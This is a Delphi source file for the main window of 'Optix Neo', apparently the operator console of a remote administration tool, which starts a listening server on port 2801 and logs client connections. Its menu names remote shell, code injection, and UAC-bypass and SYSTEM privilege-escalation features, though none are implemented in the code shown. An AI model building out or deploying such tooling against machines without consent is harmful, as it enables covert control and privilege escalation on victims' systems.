{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                              Project: Optix Neo                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/darkcodersc                        }
{                   https://bsky.app/profile/darkcodersc.bsky.social           }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{                                                                              }
{******************************************************************************}

unit uFormMain;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.Menus, VirtualTrees.BaseAncestorVCL,
  VirtualTrees.BaseTree, VirtualTrees.AncestorVCL, VirtualTrees,
  Optix.Protocol.Network.Server, Optix.Sockets.Helper, Winapi.Winsock2,
  Vcl.ComCtrls;

type
  TFormMain = class(TForm)
    MainMenu: TMainMenu;
    Server1: TMenuItem;
    Start1: TMenuItem;
    About1: TMenuItem;
    File1: TMenuItem;
    Close1: TMenuItem;
    VST: TVirtualStringTree;
    PopupMenu: TPopupMenu;
    ProcessManager1: TMenuItem;
    N1: TMenuItem;
    FileManager1: TMenuItem;
    SearchForFiles1: TMenuItem;
    N2: TMenuItem;
    ServiceManager1: TMenuItem;
    RegistryManager1: TMenuItem;
    RegistrySearch1: TMenuItem;
    N3: TMenuItem;
    RemoteShell1: TMenuItem;
    N4: TMenuItem;
    erminate1: TMenuItem;
    CodeInjection1: TMenuItem;
    N5: TMenuItem;
    FuncInEngine1: TMenuItem;
    Privesc1: TMenuItem;
    N6: TMenuItem;
    FodHelper1: TMenuItem;
    SYSTEMTaskScheduler1: TMenuItem;
    StatusBar: TStatusBar;
    procedure Close1Click(Sender: TObject);
    procedure Start1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    FServer : TOptixServerThread;

    {@M}
    procedure OnServerStart(Sender : TOptixServerThread; const ASocketFd : TSocket);
    procedure OnServerStop(Sender : TOptixServerThread);
    procedure OnServerError(Sender : TOptixServerThread; const AErrorMessage : String);

    procedure OnSessionConnect(Sender : TObject);
    procedure OnSessionDisconnect(Sender : TObject);
    procedure OnReceivePacket(Sender : TObject);

    procedure UpdateStatus(const ACaption : String = '');
  public
    { Public declarations }
  end;

var
  FormMain: TFormMain;

implementation

{$R *.dfm}

procedure TFormMain.UpdateStatus(const ACaption : String = '');
begin
  if String.IsNullOrEmpty(ACaption) then
    StatusBar.Panels[0].Text := 'Idle.'
  else
    StatusBar.Panels[0].Text := ACaption;
end;

procedure TFormMain.OnServerStart(Sender : TOptixServerThread; const ASocketFd : TSocket);
begin
  Start1.Tag := 1;
  Start1.Caption := 'Stop';
  UpdateStatus(Format('Listening on port: %d, socket: 0x%x', [FServer.Port, ASocketFd]));
end;

procedure TFormMain.OnServerStop(Sender : TOptixServerThread);
begin
  Start1.Tag := 0;
  Start1.Caption := 'Start';
  UpdateStatus();
end;

procedure TFormMain.OnServerError(Sender : TOptixServerThread; const AErrorMessage : String);
begin
  Application.MessageBox(PWideChar(AErrorMessage), 'Server Error', MB_ICONHAND);
end;

procedure TFormMain.OnSessionConnect(Sender : TObject);
begin
  allocconsole();
  writeln('Connected!');
end;

procedure TFormMain.OnSessionDisconnect(Sender : TObject);
begin
  allocconsole();
  writeln('Disconnected!');
end;

procedure TFormMain.OnReceivePacket(Sender : TObject);
begin
  ///
end;

procedure TFormMain.Close1Click(Sender: TObject);
begin
  Application.Terminate;
end;

procedure TFormMain.FormCreate(Sender: TObject);
begin
  FServer := nil;

  ///
  UpdateStatus();
end;

procedure TFormMain.Start1Click(Sender: TObject);
begin
  if Assigned(FServer) then begin
    FServer.Terminate;
    ///

    FServer := nil;
  end;

  case TMenuItem(Sender).Tag of
    0 : begin
      FServer := TOptixServerThread.Create('0.0.0.0', 2801);
      FServer.OnServerStart       := OnServerStart;
      FServer.OnServerError       := OnServerError;
      FServer.OnServerStop        := OnServerStop;
      FServer.OnSessionConnect    := OnSessionConnect;
      FServer.OnSessionDisconnect := OnSessionDisconnect;
      FServer.OnReceivePacket     := OnReceivePacket;

      ///
      FServer.Start();
    end;
  end;
end;

end.
